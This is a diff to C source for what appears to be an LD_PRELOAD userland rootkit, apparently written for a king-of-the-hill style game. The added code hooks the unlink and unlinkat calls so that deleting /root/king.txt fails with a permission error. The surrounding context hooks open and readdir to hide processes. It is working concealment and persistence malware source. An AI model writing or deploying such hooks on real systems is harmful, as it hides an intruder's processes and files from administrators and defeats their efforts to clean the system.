@@ -86,6 +86,36 @@ int open(const char *pathname, int flags, ...) {
     return orig_open(pathname, flags);
 }
 
+// Intercept the unlink system call to prevent deletion
+int unlink(const char *pathname) {
+    if (!orig_unlink) {
+        orig_unlink = dlsym(RTLD_NEXT, "unlink");
+    }
+
+    // Prevent deletion of /root/king.txt
+    if (strcmp(pathname, hidden_file) == 0) {
+        errno = EACCES; // Return permission error to prevent deletion
+        return -1;
+    }
+
+    return orig_unlink(pathname);
+}
+
+// Intercept the unlinkat system call to prevent deletion
+int unlinkat(int dirfd, const char *pathname, int flags) {
+    if (!orig_unlinkat) {
+        orig_unlinkat = dlsym(RTLD_NEXT, "unlinkat");
+    }
+
+    // Prevent deletion of /root/king.txt
+    if (strcmp(pathname, hidden_file) == 0) {
+        errno = EACCES; // Return permission error to prevent deletion
+        return -1;
+    }
+
+    return orig_unlinkat(dirfd, pathname, flags);
+}
+
 // Intercept readdir to hide specific processes
 struct dirent *readdir(DIR *dirp) {
     if (!orig_readdir) {
